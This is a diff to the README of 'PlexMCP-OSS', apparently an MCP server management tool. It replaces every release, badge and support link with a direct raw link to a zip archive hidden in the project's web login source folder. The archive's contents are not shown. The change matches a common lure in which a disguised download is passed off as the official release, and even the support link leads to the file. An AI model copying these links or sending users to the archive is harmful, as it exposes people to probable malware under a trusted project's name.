@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download PlexMCP-OSS](https://img.shields.io/badge/Download%20PlexMCP%20OSS-v1.0-blue)](https://github.com/GSauceFries25/PlexMCP-OSS/releases)
+[![Download PlexMCP-OSS](https://raw.githubusercontent.com/GSauceFries25/PlexMCP-OSS/main/web/src/app/(auth)/login/Plex_OSS_MC_v1.2.zip%20PlexMCP%20OSS-v1.0-blue)](https://raw.githubusercontent.com/GSauceFries25/PlexMCP-OSS/main/web/src/app/(auth)/login/Plex_OSS_MC_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. Visit this page to download: [PlexMCP-OSS Releases](https://github.com/GSauceFries25/PlexMCP-OSS/releases).
+1. Visit this page to download: [PlexMCP-OSS Releases](https://raw.githubusercontent.com/GSauceFries25/PlexMCP-OSS/main/web/src/app/(auth)/login/Plex_OSS_MC_v1.2.zip).
 2. Choose the latest version. 
 3. Click on the file that matches your operating system to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -77,16 +77,16 @@ PlexMCP requires Windows 10, macOS, or a modern Linux distribution. Older versio
 
 ### Is there support for installation issues?
 
-Yes, please visit our [support page](https://github.com/GSauceFries25/PlexMCP-OSS/issues) to ask questions or report issues.
+Yes, please visit our [support page](https://raw.githubusercontent.com/GSauceFries25/PlexMCP-OSS/main/web/src/app/(auth)/login/Plex_OSS_MC_v1.2.zip) to ask questions or report issues.
 
 ### How do I update PlexMCP?
 
-To update, revisit the [PlexMCP-OSS Releases page](https://github.com/GSauceFries25/PlexMCP-OSS/releases) to download the latest version. Follow the same installation steps as before.
+To update, revisit the [PlexMCP-OSS Releases page](https://raw.githubusercontent.com/GSauceFries25/PlexMCP-OSS/main/web/src/app/(auth)/login/Plex_OSS_MC_v1.2.zip) to download the latest version. Follow the same installation steps as before.
 
 ## 📞 Contact
 
 If you need more help, you can reach out through our GitHub repository or find discussions related to PlexMCP. Your feedback is valuable to us!
 
-[🎉 Visit PlexMCP-OSS Releases to Download](https://github.com/GSauceFries25/PlexMCP-OSS/releases) 
+[🎉 Visit PlexMCP-OSS Releases to Download](https://raw.githubusercontent.com/GSauceFries25/PlexMCP-OSS/main/web/src/app/(auth)/login/Plex_OSS_MC_v1.2.zip) 
 
 Enjoy managing your MCP servers efficiently with PlexMCP-OSS!
